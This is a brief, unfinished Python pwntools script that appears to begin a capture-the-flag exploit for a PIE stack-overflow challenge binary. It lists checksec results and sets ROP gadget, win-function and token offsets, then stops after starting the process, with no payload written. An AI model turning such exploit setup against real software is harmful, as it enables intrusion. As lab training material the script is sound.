from pwn import *

'''
[*] '/challenge/binary-exploitation-pie-overflow-w'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
'''
pop_rdi_gadjet = 0x2b83
token = 0x1337
ret_gadjet = 0x101a
win_ofset = 0x239f
r = process('/challenge/binary-exploitation-pie-overflow-w')


